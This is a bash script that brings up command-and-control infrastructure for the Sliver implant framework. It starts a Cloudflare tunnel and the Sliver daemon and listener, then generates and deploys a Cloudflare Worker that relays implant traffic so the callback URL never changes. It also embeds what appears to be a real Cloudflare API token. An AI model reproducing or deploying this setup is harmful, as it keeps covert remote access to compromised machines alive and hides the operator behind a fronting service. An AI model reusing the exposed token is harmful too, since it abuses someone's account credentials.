#!/bin/bash
# C2 startup - Worker (permanent) + Cloudflare Tunnel (bridge)
# Implant URL: sliver-c2.pantha704.workers.dev (NEVER CHANGES - no rebuild needed)
# Run: bash /home/panther/c2-start.sh

set -e
CF_TOKEN="8-1_Jit0jHz8Z5zryHMNwF57ENl5PuojgwBUMdSR"

echo "[*] Starting Cloudflare Tunnel..."
pkill -f cloudflared 2>/dev/null || true
sleep 1
cloudflared tunnel --url http://localhost:8080 > /home/panther/c2-tunnel.log 2>&1 &
sleep 6

TUNNEL=$(grep -oP '[a-z0-9-]+\.trycloudflare\.com' /home/panther/c2-tunnel.log)
if [ -z "$TUNNEL" ]; then
    echo "[!] Tunnel failed"
    exit 1
fi
echo "[+] Tunnel: $TUNNEL"

echo "[*] Starting Sliver daemon + HTTP listener..."
pkill -9 sliver 2>/dev/null || true
sleep 2
sliver daemon --lhost 127.0.0.1 --lport 31337 > /home/panther/c2-daemon.log 2>&1 &
sleep 4

cat > /tmp/sliver-http.txt << EOF
http --lhost 127.0.0.1 --lport 8080
EOF
script -q -c "timeout 20 sliver --rc /tmp/sliver-http.txt" /dev/null 2>&1 &
sleep 4

echo "[*] Updating Worker to forward to tunnel..."
python3 -c "
with open('/home/panther/sliver-worker/worker.js','w') as f:
    f.write('''export default {
  async fetch(request, env) {
    const url = new URL(request.url)
    const target = 'https://${TUNNEL}' + url.pathname + url.search
    const body = request.method !== 'GET' && request.method !== 'HEAD' ? await request.arrayBuffer() : undefined
    const modified = new Request(target, {
      method: request.method,
      headers: request.headers,
      body
    })
    try { return await fetch(modified) } catch(e) { return new Response('offline', { status: 503 }) }
  }
}''')
"
cd /home/panther/sliver-worker && CLOUDFLARE_API_TOKEN="$CF_TOKEN" wrangler deploy 2>&1 | grep -E "worker|Error"

echo ""
echo "  C2 LIVE: sliver-c2.pantha704.workers.dev:443"
echo "  Tunnel:  $TUNNEL"
echo "  Implant URL never changes - no rebuild needed"
